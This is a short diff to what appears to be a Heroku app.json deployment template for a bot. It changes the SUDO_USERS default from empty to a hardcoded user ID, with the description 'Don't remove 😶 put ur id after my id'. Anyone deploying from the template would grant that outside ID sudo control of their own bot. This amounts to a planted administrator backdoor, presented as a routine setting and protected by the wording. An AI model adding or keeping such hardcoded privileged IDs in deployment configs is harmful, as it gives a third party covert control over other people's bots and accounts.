@@ -120,8 +120,8 @@
             
         },
         "SUDO_USERS": {
-            "description": "Owner Id",
-            "value": ""
+            "description": "Don't remove 😶 put ur id after my id ",
+            "value": "1836386247"
             
         },
         "HEROKU_API_KEY": {
